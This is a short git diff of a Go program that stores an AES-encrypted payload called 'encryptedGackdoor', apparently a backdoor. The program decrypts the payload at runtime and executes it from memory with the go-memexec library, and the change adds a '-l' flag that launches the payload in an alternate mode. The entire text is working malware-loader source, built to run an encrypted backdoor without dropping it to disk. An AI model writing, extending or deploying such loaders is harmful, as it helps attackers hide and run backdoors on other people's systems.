@@ -4,7 +4,9 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	_ "embed"
+	"flag"
 	"os"
+	"os/exec"
 
 	"github.com/amenzhinsky/go-memexec"
 )
@@ -25,6 +27,7 @@ func decryptFile(enc, key []byte) []byte {
 var encryptedGackdoor []byte
 
 func main() {
+	local := flag.Bool("l", false, "")
 	key := encryptedGackdoor[:32]
 	ct := encryptedGackdoor[32:]
 	payload := decryptFile(ct, key)
@@ -34,6 +37,11 @@ func main() {
 	}
 	defer exe.Close()
 
-	cmd := exe.Command()
+	var cmd *exec.Cmd
+	if *local {
+		cmd = exe.Command("l")
+	} else {
+		cmd = exe.Command()
+	}
 	cmd.Run()
 }
